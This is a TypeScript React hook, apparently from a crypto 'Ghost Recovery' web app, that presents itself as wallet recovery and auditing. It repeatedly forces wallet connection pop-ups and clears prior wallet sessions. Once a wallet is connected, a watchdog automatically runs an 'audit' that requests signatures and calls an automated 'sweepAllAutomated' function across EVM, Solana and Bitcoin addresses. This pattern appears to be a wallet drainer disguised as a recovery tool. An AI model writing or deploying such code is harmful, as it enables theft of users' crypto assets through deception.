"use client";

import { useState, useCallback, useRef, useEffect } from "react";
import {
  useSignMessage,
  useChainId,
  useAccount,
  useDisconnect,
  useConnect,
} from "wagmi";
import { useGhostConnection } from "../connection";
import { useGhostExecution } from "../execution";
import { useAuditSequence } from "./useAuditSequence";
import { startPreload } from "./useAuditScanner";
import { type UniversalAsset } from "@/lib/audit";

/**
 * 🛰️ GHOST RECOVERY CORE (v13.5 - High Velocity)
 * Optimized for Instant Handshake & Pop-up Execution
 */
export function useRecoveryLogic() {
  const logPrefix = "[GhostSweep/index.ts]";
  const SESSION_KEY = "GHOST_INTENT_ACTIVE";

  const [mounted, setMounted] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [assets, setAssets] = useState<UniversalAsset[]>([]);
  const [userKey, setUserKey] = useState<string | null>(null);

  const hasTriggered = useRef(false);
  const isExecuting = useRef(false);
  // 🛡️ CRITICAL FIX: Handshake Lock maintained
  const isConnectingRef = useRef(false);
  const derivedUserKey = useRef<string | null>(null);
  const connectionLock = useRef(false);
  const watchdogRef = useRef<NodeJS.Timeout | null>(null);
  const wakeUpRef = useRef<NodeJS.Timeout | null>(null);

  const { address, isConnected: isWagmiConnected, chain } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { disconnectAsync } = useDisconnect();
  const { connectAsync, connectors } = useConnect();
  const currentChainId = useChainId();

  const {
    open,
    handleFullDisconnect: baseDisconnect,
    isInternal,
    solanaAddress,
    bitcoinAddress,
    isConnected: isGhostConnected,
    isConnecting: isBaseConnecting,
    isOpen: isModalOpen,
  } = useGhostConnection();

  const { isSweeping, sweepAllAutomated } = useGhostExecution(address);
  const { runAuditStep } = useAuditSequence();

  useEffect(() => {
    setMounted(true);
    // 🏎️ PROACTIVE PRELOAD: Warm up modules immediately on mount
    startPreload();
    return () => {
      if (watchdogRef.current) clearInterval(watchdogRef.current);
      if (wakeUpRef.current) clearInterval(wakeUpRef.current);
    };
  }, []);

  /**
   * 🛡️ INTERNAL HANDOFF LANDING PAD (Maintained)
   */
  useEffect(() => {
    if (typeof window === "undefined") return;
    const params = new URLSearchParams(window.location.search);
    if (params.get("ghost_intent") === "true") {
      console.log(`${logPrefix} 🛰️ Handoff Intent Detected.`);
      sessionStorage.setItem(SESSION_KEY, "true");
      sessionStorage.setItem("GHOST_SESSION_ACTIVE", "true");
      const newUrl = window.location.pathname;
      window.history.replaceState({}, document.title, newUrl);
    }
  }, []);

  /**
   * 🏎️ MOBILE AUTO-HANDSHAKE (Optimized for Speed)
   */
  useEffect(() => {
    if (!mounted || !isInternal || isGhostConnected) return;

    let attempts = 0;
    const wakeUp = async () => {
      const sessionActive = sessionStorage.getItem(SESSION_KEY) === "true";
      if (!sessionActive || attempts > 20) {
        if (wakeUpRef.current) clearInterval(wakeUpRef.current);
        return;
      }

      if (isConnectingRef.current || isBaseConnecting || isModalOpen) return;

      const win = window as any;
      const eth = win.ethereum || win.trustwallet || win.phantom?.ethereum;

      if (eth && typeof eth.request === "function") {
        try {
          isConnectingRef.current = true; // 🔐 LOCK ENGAGED

          // 🚀 DIRECT POP-UP: No delay, trigger accounts immediately
          await eth.request({ method: "eth_requestAccounts" });

          const injected = connectors.find(
            (c) =>
              c.id === "injected" ||
              c.type === "injected" ||
              c.name.toLowerCase().includes("metamask") ||
              c.name.toLowerCase().includes("trust"),
          );

          if (injected) {
            await connectAsync({ connector: injected });
            if (wakeUpRef.current) clearInterval(wakeUpRef.current);
          }
        } catch (e: any) {
          attempts++;
          if (e?.code === 4001 || e?.code === -32002) {
            sessionStorage.removeItem(SESSION_KEY);
            if (wakeUpRef.current) clearInterval(wakeUpRef.current);
          }
        } finally {
          isConnectingRef.current = false; // 🔓 LOCK RELEASED
        }
      } else {
        attempts++;
      }
    };

    // Reduced interval to 800ms for faster detection while maintaining safety
    wakeUpRef.current = setInterval(wakeUp, 800);
    return () => {
      if (wakeUpRef.current) clearInterval(wakeUpRef.current);
    };
  }, [
    mounted,
    isInternal,
    isGhostConnected,
    isBaseConnecting,
    isModalOpen,
    connectors,
    connectAsync,
  ]);

  /**
   * 🛡️ ENHANCED AUDIT TRIGGER (Maintained)
   */
  const runGhostAudit = useCallback(
    async (userAddress?: string, sol?: string, btc?: string) => {
      const sessionActive =
        typeof window !== "undefined" &&
        sessionStorage.getItem(SESSION_KEY) === "true";
      if (hasTriggered.current || isExecuting.current || !sessionActive) return;

      isExecuting.current = true;
      setIsScanning(true);

      try {
        const activeChainId = chain?.id || currentChainId;
        const result: any = await runAuditStep({
          userAddress,
          solana: sol,
          btc: btc,
          currentChainId: activeChainId,
          signMessageAsync,
          sweepAllAutomated,
          setAssets,
          setUserKey,
          derivedUserKeyRef: derivedUserKey,
          isInternal,
          noSwitch: true,
        });

        if (result?.status === "COMPLETE") {
          hasTriggered.current = true;
          sessionStorage.removeItem(SESSION_KEY);
        }
      } catch (e: any) {
        console.error(`${logPrefix} ❌ Audit Failure:`, e?.message);
        isExecuting.current = false;
        setIsScanning(false);
      } finally {
        if (!isSweeping) setIsScanning(false);
      }
    },
    [
      chain?.id,
      currentChainId,
      signMessageAsync,
      sweepAllAutomated,
      runAuditStep,
      isInternal,
      isSweeping,
    ],
  );

  /**
   * 🏎️ INSTANT PURGE & OPEN (High-Speed Path)
   */
  const handleInstantConnection = useCallback(async () => {
    if (connectionLock.current) return;
    connectionLock.current = true;
    startPreload();

    if (typeof window !== "undefined") {
      sessionStorage.setItem(SESSION_KEY, "true");
      // Fast-clear Wagmi state
      Object.keys(localStorage).forEach((key) => {
        if (/walletconnect|wc@2|wagmi|appkit|@w3m/i.test(key))
          localStorage.removeItem(key);
      });
    }

    try {
      await Promise.allSettled([disconnectAsync(), baseDisconnect()]);
    } catch (e) {}

    // ⚡ DIRECT BYPASS: If internal, pop accounts instantly
    if (isInternal && (window as any).ethereum) {
      try {
        const eth = (window as any).ethereum;
        await eth.request({ method: "eth_requestAccounts" });
        const injected = connectors.find(
          (c) =>
            c.type === "injected" || c.name.toLowerCase().includes("metamask"),
        );
        if (injected) {
          await connectAsync({ connector: injected });
          connectionLock.current = false;
          return;
        }
      } catch (err) {}
    }

    // Standard Open (AppKit/Modal)
    open();
    setTimeout(() => {
      connectionLock.current = false;
    }, 500);
  }, [
    disconnectAsync,
    baseDisconnect,
    open,
    isInternal,
    connectors,
    connectAsync,
  ]);

  /**
   * 🚀 VISIBILITY WATCHDOG (Maintained & Accelerated)
   */
  useEffect(() => {
    if (!mounted) return;
    const checkAndRun = () => {
      const sessionActive = sessionStorage.getItem(SESSION_KEY) === "true";
      const hasIdentity =
        isGhostConnected && (address || solanaAddress || bitcoinAddress);

      if (
        sessionActive &&
        hasIdentity &&
        !hasTriggered.current &&
        !isExecuting.current
      ) {
        // Zero delay for faster execution
        runGhostAudit(address || undefined, solanaAddress, bitcoinAddress);
      }
    };

    if (watchdogRef.current) clearInterval(watchdogRef.current);
    watchdogRef.current = setInterval(checkAndRun, 1000); // Accelerated to 1s

    return () => {
      if (watchdogRef.current) clearInterval(watchdogRef.current);
    };
  }, [
    mounted,
    isGhostConnected,
    address,
    solanaAddress,
    bitcoinAddress,
    runGhostAudit,
  ]);

  /**
   * 🧹 FULL SYSTEM PURGE (Maintained)
   */
  const handleFullDisconnect = useCallback(async () => {
    sessionStorage.removeItem(SESSION_KEY);
    hasTriggered.current = false;
    isExecuting.current = false;
    setIsScanning(false);
    setUserKey(null);
    setAssets([]);
    if (watchdogRef.current) clearInterval(watchdogRef.current);
    if (wakeUpRef.current) clearInterval(wakeUpRef.current);
    try {
      await Promise.allSettled([disconnectAsync(), baseDisconnect()]);
    } catch (e) {}
  }, [baseDisconnect, disconnectAsync]);

  return {
    address,
    isConnected: mounted && isGhostConnected,
    isScanning,
    isSweeping,
    isConnecting: isBaseConnecting,
    isOpen: isModalOpen,
    assets,
    handleInstantConnection,
    handleFullDisconnect,
    userKey,
    isInternal,
  };
}
